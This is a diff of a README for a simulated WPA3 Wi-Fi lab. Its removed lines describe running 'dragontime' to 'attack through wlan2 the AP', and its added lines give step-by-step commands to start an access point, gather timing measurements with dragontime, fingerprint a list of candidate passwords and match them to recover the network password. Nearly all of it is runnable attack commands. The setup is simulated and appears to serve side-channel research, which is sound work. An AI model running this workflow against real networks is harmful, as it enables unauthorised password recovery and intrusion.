@@ -1,31 +1,31 @@
-How to run the wlan simulation:
-
-Clone the relevant repositories from GitHub into "Projects" directory.
-
-Make wpa_supplicant and hostapd as instructed.
-
-Run:
-
+Before starting, run:
 ```
-sudo modprobe mac80211_hwsim radios=3
-
-sudo systemctl stop NetworkManager.service
-
-sudo macchanger --mac=00:11:00:00:00:00 wlan0
-sudo macchanger --mac=00:22:00:00:00:00 wlan1
-sudo macchanger --mac=00:33:00:00:00:00 wlan2
-
-sudo ~/Projects/hostap-wpa3/hostapd/hostapd hostapd_wpa3.conf -dd -K
-sudo ~/Projects/hostap-wpa3/wpa_supplicant/wpa_supplicant -D nl80211 -i wlan1 -c supp_wpa3.conf -dd -K
+sudo sh setup.sh
 ```
 
-Now we have a simulated AP running on wlan0 with MAC 00:11:00:00:00:00, and a simulated client running on wlan1 with MAC
-00:22:00:00:00:00.
+Choose your password and put it inside hostapd_wpa3.conf. 
 
-To actually gather data, run:
+Now, to start the AP, run:
 
 ```
-sudo ~/Projects/dragondrain-and-time/src/dragontime -d wlan2 -a 00:11:00:00:00:00 -c 1 -g 22 -i 250 -t 750 -o measurements.txt
+sudo ./hostapd hostapd_wpa3.conf -dd -K
 ```
 
-Which will attack through wlan2 the AP and gather the measurements.
+And to start taking measurements, run:
+```
+sudo ./dragontime -d wlan2 -a 00:11:00:00:00:00 -o measurements/PASSWORD.txt
+```
+Replace "PASSWORD" with your chosen filename. 
+
+After getting 50-100 measurements, stop dragontime with CTRL+C.
+
+To generate fingerprints for passwords, run:
+```
+./fingerprint passwords.txt out.csv
+```
+When passwords.txt is a file containing passwords, each in their own line, and the result will be saved to out.csv. 
+
+After getting measurements and fingerprints, run:
+```
+python find_matches.py measurements/PASSWORD.txt out.csv
+```
